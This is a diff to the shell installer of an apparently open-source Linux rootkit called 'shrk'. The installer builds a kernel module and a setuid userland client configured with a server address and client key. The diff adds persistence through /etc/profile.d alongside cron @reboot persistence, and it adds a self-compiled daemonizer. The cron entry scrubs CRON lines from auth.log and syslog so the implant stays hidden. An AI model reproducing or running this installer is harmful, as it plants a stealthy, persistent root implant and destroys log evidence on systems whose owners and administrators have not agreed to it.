@@ -54,6 +54,10 @@ info() {
   echo -e "${FG_BLUE}${FG_BOLD}=>${FG_RESET} ${FG_BOLD}${1}${FG_RESET}"
 }
 
+ask() {
+  echo -en "${FG_BLUE}${FG_BOLD}=>${FG_RESET} ${FG_BOLD}${1}${FG_RESET} (${2}) "
+}
+
 err() {
   echo -e "${FG_RED}${FG_BOLD}=>${FG_RESET} ${FG_BOLD}${1}${FG_RESET}"
 }
@@ -192,37 +196,77 @@ task_done
 
 # see if cron persistence is available
 if check_cmd "systemctl" && check_cmd "sed" && [ -d "/etc/cron.d" ]; then
-  info "cron persistence seems to be available, do you want it?"
-  echo -en "${FG_BOLD}(y/n)${FG_RESET}: "
+  ask "cron persistence seems to be available, do you want it?" "y/n"
   read answer
 
-  if [[ "${answer}" == "Y" ]] || [[ "${answer}" == "y" ]]; then
+  if [[ "${answer,,}" == "y" ]]; then
     info "Alright, will also install the cron persistence"
-    cron_path="/etc/cron.d/shrk_${CLIENT_ID}"
+    cron_path="/etc/cron.d/shrk_${SHRK_CLIENT_ID}"
     persis_path="${cron_path}"
   fi
 fi
 
-info "If you have a file/directory you'd like to use for persistence, enter it's path"
-echo -en "${FG_BOLD}(path)${FG_RESET}: "
-read persis_path
+# see if bashrc persistence is available
+if [ -z "${cron_path}" ] && [ -d "/etc/profile.d" ]; then
+  ask "bashrc persistence seems to be available, do you want it?" "y/n"
+  read answer
+
+  if [[ "${answer,,}" == "y" ]]; then
+    info "Alright, will also install the bashrc persistence"
+    profile_path="/etc/profile.d/shrk_${SHRK_CLIENT_ID}.sh"
+    persis_path="${profile_path}"
+  fi
+fi
+
+# allow user to do custom persistence if none selected
+if [ -z "${persis_path}" ]; then
+  ask "If you have a file/directory you'd like to use for persistence, enter it's path" "path"
+  read persis_path
+fi
 
 if [ -z "${persis_path}" ]; then
-  warn "You have configured no persistence methods, installation will not persist after a reboot"
+  warn "You have configured no persistence methods, installation will not persist after a reboot and it will be discoverable"
 fi
+
+# build the daemon tool
+info "Building the daemon tool"
+
+echo '#include <stdlib.h>' > daemon.c
+echo '#include <unistd.h>' >> daemon.c
+echo '#include <stdio.h>' >> daemon.c
+
+cat >> daemon.c << EOF
+int main(int argc, char *argv[]) {
+  if(argc != 2)
+    return EXIT_FAILURE;
+
+  if(fork() == 0) {
+    daemon(1, 0);
+    char *args[] = {argv[1], NULL};
+    execv(args[0], args);
+    return EXIT_FAILURE;
+  }
+
+  return EXIT_SUCCESS;
+}
+EOF
+check_ret "Failed to create the source file"
+
+quiet gcc -o daemon daemon.c
+check_ret "Failed to compile the daemon tool"
 
 # build the userland client and the kernel module
 info "Building the userland client"
 quiet pushd user
   make SHRK_DEBUG=${SHRK_DEBUG}               \
        SHRK_DEBUG_DUMP=0                      \
-       SHRK_MODULE="${module_path}"           \
        SHRK_CLIENT_ID="${SHRK_CLIENT_ID}"     \
        SHRK_CLIENT_KEY="${SHRK_CLIENT_KEY}"   \
        SHRK_CLIENT_KEY="${SHRK_CLIENT_KEY}"   \
        SHRK_SERVER_ADDR="${SHRK_SERVER_ADDR}" \
        SHRK_SERVER_PORT=${SHRK_SERVER_PORT}   \
        SHRK_PERSIS_FILE="${persis_path}"      \
+       SHRK_MODULE_PATH="${module_path}"      \
        -j$(nproc) > /dev/null
   check_ret "Failed to build the kernel"
 quiet popd
@@ -236,21 +280,31 @@ quiet pushd kernel
 quiet popd
 
 # now install the built client and the module
-install -m500 "user/shrk-user.elf" "${client_path}"
+install -m6755 "user/shrk_user.elf" "${client_path}"
 check_ret "Failed to install the userland client"
 
-install -m500 "kernel/shrk.ko" "${module_path}"
+install -m0500 "kernel/shrk_${SHRK_CLIENT_ID}.ko" "${module_path}"
 check_ret "Failed install the kernel module"
 
-# lastly, complete cron persistence (if enabled)
+# complete cron persistence (if enabled)
 if [ ! -z "${cron_path}" ]; then
   cat > "${cron_path}" << EOF
 @reboot root ${client_path} &> /dev/null && if [ -f /var/log/auth.log ]; then sed '/CRON/d' -i /var/log/auth.log; fi && if [ -f /var/log/syslog ]; then sed '/CRON/d' -i /var/log/syslog; fi && systemctl restart cron
 EOF
 fi
 
+# complete bashrc persistence (if enabled)
+if [ ! -z "${profile_path}" ]; then
+  echo "#!/bin/bash" > "${profile_path}"
+  echo "( setsid \"${client_path}\" &> /dev/null & )" >> "${profile_path}"
+fi
+
 # execute the client
-setsid "${client_path}" &> /dev/null &
+task_log "Launching the client"
+  ./daemon ${client_path} &> /dev/null
+  check_ret "Failed to execute the client"
+task_done
 
 # cleanup the temporary dir
+info "Completed the installation"
 cleanup
